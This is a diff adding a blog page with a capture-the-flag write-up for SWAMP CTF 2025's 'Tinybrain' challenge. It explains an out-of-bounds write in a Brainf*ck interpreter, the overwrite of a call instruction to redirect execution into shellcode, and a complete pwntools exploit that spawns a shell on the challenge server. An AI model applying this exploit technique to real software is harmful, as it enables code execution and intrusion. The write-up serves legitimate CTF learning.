@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SWAMP CTF 2025 - Tinybrain | F0ndueSav0yarde</title>
+<meta name="title" content="SWAMP CTF 2025 - Tinybrain" />
+<meta name="description" content="Tinybrain" />
+<meta name="author" content="" />
+<meta name="keywords" content="" />
+
+
+
+
+
+
+  
+  <meta property="og:url" content="https://f0nduesav0yarde.github.io/blog/writeups/swampctf_2025_tinybrain/">
+  <meta property="og:site_name" content="F0ndueSav0yarde">
+  <meta property="og:title" content="SWAMP CTF 2025 - Tinybrain">
+  <meta property="og:description" content="Tinybrain">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SWAMP CTF 2025 - Tinybrain">
+  <meta name="twitter:description" content="Tinybrain">
+
+
+  
+  
+  <meta itemprop="name" content="SWAMP CTF 2025 - Tinybrain">
+  <meta itemprop="description" content="Tinybrain">
+  <meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="wordCount" content="536">
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/original.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Skip to main content</a>
+
+<a href="/" class="title"><h1>F0ndueSav0yarde</h1></a>
+<nav>
+
+
+
+
+
+
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>SWAMP CTF 2025 - Tinybrain</h1>
+
+
+<content>
+  <p><strong>Category : PWN</strong></p>
+<h2 id="phreaks-2600">Phreaks 2600</h2>
+<p>You can find this writeup at <a href="https://phreaks2600.fr/blog/swamp-2025-tinybrain/">Phreaks 2600 website</a></p>
+<h2 id="context">Context</h2>
+<p>This challenge was about a vulnerable Brainf*ck interpreter. Here are the allowed instruction set :</p>
+<ul>
+<li><code>+</code> : increment the value pointed by array cursor</li>
+<li><code>-</code> : decrement the value pointed by array cursor</li>
+<li><code>&gt;</code> : increment the cursor (shift the pointer to the right)</li>
+<li><code>&lt;</code> : decrement the cursor (shift the pointer to the left)</li>
+<li><code>[</code> : start a loop until the value of the cursor is 0</li>
+<li><code>]</code> : end of the loop, jump to the previous <code>[</code></li>
+<li><code>.</code> : print a char in ASCII convention in STDOUT</li>
+<li><code>,</code> : input of a char in STDIN</li>
+</ul>
+<h2 id="vulnerabilty">Vulnerabilty</h2>
+<p>There was an out-of-bounds because no bounds verification was made when using <code>&gt;</code> and <code>&lt;</code> instructions.</p>
+<h2 id="strategy">Strategy</h2>
+<p>Because the <code>.text</code> segment was mapped as RWX, it was possible to write our shellcode somewhere and redirect execution flow . We could see this as a <em>“VM escape”</em>.</p>
+<p>I started to code the helper functions that will be useful for the final payload :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">def</span> <span class="nf">right</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">def</span> <span class="nf">left</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;+&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">set_to_zero</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;[-]&#39;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">set_to</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">return</span> <span class="n">set_to_zero</span><span class="p">()</span> <span class="o">+</span> <span class="n">add</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">def</span> <span class="nf">getchar</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;,&#39;</span></span></span></code></pre></div><p>The buffer starts at <code>0x403800</code> but i have to do an out-of-bounds to escape the interpreter.<br>
+I will start writing my shellcode at <code>0x4010ba</code>.<br>
+However, i have to notify the interpreter that i want to jump to my shellcode at <code>0x4010ba</code>. How can i do that ?</p>
+<h2 id="redirection-of-execution-flow">Redirection of execution flow</h2>
+<p>We can overwrite anything, anywhere : why not overwriting interpreter code directly ?<br>
+I could change <code>call 0x40102a</code> (at address <code>0x40101e</code>) to <code>call 0x4010ba</code> (address of shellcode) by changing one byte :</p>
+
+
+
+
+
+<pre tabindex="0"><code>Before byte overwrite :
+0x40101e:    0x0000[07]e8    &lt;call 0x40102a&gt;
+
+After byte overwrite :
+0x40101e:    0x0000[97]e8    &lt;call 0x4010ba&gt;</code></pre><p>The overwriting of <code>0x97</code> value at <code>0x40101f</code> will redirect the execution flow into our shellcode.</p>
+<blockquote>
+<p>Of course, we have to do this after writing our shellcode because it will break the interpreter and we won’t be able to parse any brainf*ck code again.</p>
+</blockquote>
+<p>Here is the layout of the final payload :</p>
+
+
+
+
+
+<pre tabindex="0"><code>     +----------+
+     | 0x401000 | &lt;- start of interpreter code
+     +----------+
+     |   ...    |
+     +----------+
+     | 0x40101e | &lt;- (call 0x40102a) that will become (call 0x4010ba) -----+
+     +----------+                                                          |
+     |   ...    |                                                          |
+     +----------+                                                          |
++--&gt; | 0x4010ba | &lt;- start of our shellcode  &lt;-----------------------------+
+|    +----------+
+|    |   ...    |
+|    +----------+
++--- | 0x403800 | &lt;- Contains payload full of &#39;&lt;&#39; with shellcode
+     +----------+</code></pre><h2 id="exploit">Exploit</h2>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">def</span> <span class="nf">right</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">left</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;+&#39;</span><span class="o">*</span><span class="n">x</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">def</span> <span class="nf">set_to_zero</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;[-]&#39;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">def</span> <span class="nf">set_to</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">return</span> <span class="n">set_to_zero</span><span class="p">()</span> <span class="o">+</span> <span class="n">add</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">def</span> <span class="nf">getchar</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;,&#39;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">def</span> <span class="nf">write_shellcode</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">),</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="n">z</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">z</span> <span class="o">+=</span> <span class="n">set_to</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">z</span> <span class="o">+=</span> <span class="n">right</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">return</span> <span class="n">z</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">left</span><span class="p">(</span><span class="mh">0x403800</span><span class="o">-</span><span class="mh">0x4010ba</span><span class="p">)</span> <span class="o">+</span> <span class="n">write_shellcode</span><span class="p">()</span> <span class="o">+</span> <span class="n">left</span><span class="p">(</span><span class="mi">192</span><span class="p">)</span> <span class="o">+</span> <span class="n">getchar</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="o">+</span>  <span class="sa">b</span><span class="s1">&#39;q&#39;</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chals.swampctf.com&#34;</span><span class="p">,</span><span class="mi">41414</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x97</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="notes">Notes</h2>
+<blockquote>
+<p>This challenge should be called with a filename in <code>argv[1]</code> to work locally. But in remote, an input was provided.</p>
+</blockquote>
+<script>
+
+
+</script>
+
+<script>
+var all_codeblocks = document.getElementsByClassName("chroma")
+for(let i=0;i<all_codeblocks.length;i++)
+{
+    all_lines_of_a_codeblock = all_codeblocks[i].getElementsByClassName("line");
+    let start_number = -1;
+    start_number = parseInt(all_lines_of_a_codeblock[0].getElementsByTagName("span")[2].innerHTML,10);
+    all_lines_of_a_codeblock[0].style.display = "none";    
+    for(let line=1;line<all_lines_of_a_codeblock.length;line++)
+    {
+        let diff = String(all_lines_of_a_codeblock.length).length - String(start_number).length;
+        if(diff > 0)
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = "<span style='visibility:hidden;'>" + "0".repeat(diff) + "</span>" + String(start_number);
+        }
+        else
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number);
+        }
+        start_number = start_number + 1;
+    }
+}
+</script>
+
+</content>
+<p>
+  
+</p>
+
+
+
+
+  </main>
+  <footer></footer>
+
+    
+</body>
+
+</html>
